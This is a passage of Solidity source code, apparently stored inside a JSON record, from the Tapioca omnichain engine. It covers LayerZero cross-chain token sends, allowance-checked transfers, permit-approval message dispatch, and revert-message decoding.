by passing `_srcChainSender`.\n\n        // Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.\n        msgReceipt =\n            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);\n        // Formulate the OFT receipt.\n        oftReceipt = OFTReceipt(amountDebitedLD_, amountToCreditLD_);\n\n        emit OFTSent(msgReceipt.guid, _lzSendParam.sendParam.dstEid, _srcChainSender, amountDebitedLD_);\n    }\n\n    /**\n     * @dev Performs a transfer with an allowance check and consumption against the xChain msg sender.\n     * @dev Can only transfer to this address.\n     *\n     * @param _owner The account to transfer from.\n     * @param srcChainSender The address of the sender on the source chain.\n     * @param _amount The amount to transfer\n     */\n    function _internalTransferWithAllowance(address _owner, address srcChainSender, uint256 _amount) internal {\n        if (_owner != srcChainSender) {\n            _spendAllowance(_owner, srcChainSender, _amount);\n        }\n\n        _transfer(_owner, address(this), _amount);\n    }\n\n    /**\n     * @notice Sends a permit/approval call to the `tapiocaOmnichainReceiveExtender` contract.\n     * @param _msgType The type of the message.\n     * @param _data The call data containing info about the message.\n     * @return success is the success of the composed message handler. If no handler is found, it should return false to trigger `InvalidMsgType()`.\n     */\n    function _extExec(uint16 _msgType, bytes memory _data) internal returns (bool) {\n        if (_msgType == MSG_APPROVALS) {\n            toeExtExec.erc20PermitApproval(_data);\n        } else if (_msgType == MSG_NFT_APPROVALS) {\n            toeExtExec.erc721PermitApproval(_data);\n        } else if (_msgType == MSG_PEARLMIT_APPROVAL) {\n            toeExtExec.pearlmitApproval(_data);\n        } else if (_msgType == MSG_YB_APPROVE_ALL) {\n            toeExtExec.yieldBoxPermitAll(_data);\n        } else if (_msgType == MSG_YB_APPROVE_ASSET) {\n            toeExtExec.yieldBoxPermitAsset(_data);\n        } else if (_msgType == MSG_MARKET_PERMIT) {\n            toeExtExec.marketPermit(_data);\n        } else {\n            return false;\n        }\n        return true;\n    }\n\n    // ***************** //\n    // ***** UTILS ***** //\n    // ***************** //\n\n    /**\n     * @dev For details about this function, check `BaseTapiocaOmnichainEngine._buildOFTMsgAndOptions()`.\n     * @dev !!!! IMPORTANT !!!! The differences are:\n     *      - memory instead of calldata for parameters.\n     *      - `_msgSender` is used instead of using context `msg.sender`, to preserve context of the OFT call and use `msg.sender` of the source chain.\n     *      - Does NOT combine options, make sure to pass valid options to cover gas costs/value transfers.\n     */\n    function _buildOFTMsgAndOptionsMemory(\n        SendParam memory _sendParam,\n        bytes memory _extraOptions,\n        bytes memory _composeMsg,\n        uint256 _amountToCreditLD,\n        address _msgSender\n    ) internal view returns (bytes memory message, bytes memory options) {\n        bool hasCompose = _composeMsg.length > 0;\n\n        message = hasCompose\n            ? abi.encodePacked(\n                _sendParam.to, _toSD(_amountToCreditLD), OFTMsgCodec.addressToBytes32(_msgSender), _composeMsg\n            )\n            : abi.encodePacked(_sendParam.to, _toSD(_amountToCreditLD));\n        options = _extraOptions;\n\n        if (msgInspector != address(0)) {\n            IOAppMsgInspector(msgInspector).inspect(message, options);\n        }\n    }\n\n    /**\n     * @notice Return the revert message from an external call.\n     * @param _returnData The return data from the external call.\n     */\n    function _getTOEExtenderRevertMsg(bytes memory _returnData) internal pure returns (string memory) {\n        if (_returnData.length > 1000) return \"Module: reason too long\";\n\n        // If the _res length is less than 68, then the transaction failed silently (without a revert message)\n        if (_returnData.length < 68) return \"Module: data\";\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            // Slice the sighash.\n            _returnData := add(_returnData, 0x04)\n        }\n        return abi.decode(_returnData, (string)); // All that remains is the revert string\n    }\n}"
    }
  ]
}